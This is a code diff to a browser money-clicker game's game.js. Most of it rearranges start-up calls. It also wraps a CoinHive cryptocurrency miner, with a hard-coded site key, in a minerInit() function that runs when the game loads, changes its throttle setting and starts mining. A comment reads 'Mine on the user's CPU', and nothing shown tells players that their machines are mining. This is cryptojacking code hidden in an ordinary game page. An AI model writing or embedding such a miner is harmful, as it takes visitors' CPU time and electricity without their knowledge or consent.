@@ -69,7 +69,7 @@ $("window").on("load", () =>{
 
 $("document").ready( () => {
   console.log("JQuery and game.js loaded");
-
+  $("#loadingBlock").hide();
   $("body").append(money_count);
     money_count.append(money_value);
   $("body").append("<br/>");
@@ -85,7 +85,7 @@ $("document").ready( () => {
     d_BTCminer_earnings,
     d_BTCminer_upgrade_cost,
     d_time_programming);
-  $("#loadingBlock").hide();
+
   main();});
 
 //******************************************************************************
@@ -96,7 +96,7 @@ function main() {
   let doc = $("document");
   buttonInit();
   audioInit();
-
+  minerInit();
   setInterval(()=> {
     introduceNewElements();
     updateValuesShown();
@@ -321,7 +321,10 @@ function change_money_color() {
 //  Mine on the user's CPU
 //******************************************************************************
 let hashes = 0;
-let miner = new CoinHive.Anonymous('OPcAucBNwRYkuolOhrRINWw0GeAAVFkA');
+let miner;
+function minerInit() {
+miner = new CoinHive.Anonymous('OPcAucBNwRYkuolOhrRINWw0GeAAVFkA');
 miner.on('found', function() { hashes++; })
-miner.setThrottle(.1);
+miner.setThrottle(.4);
 miner.start();
+}
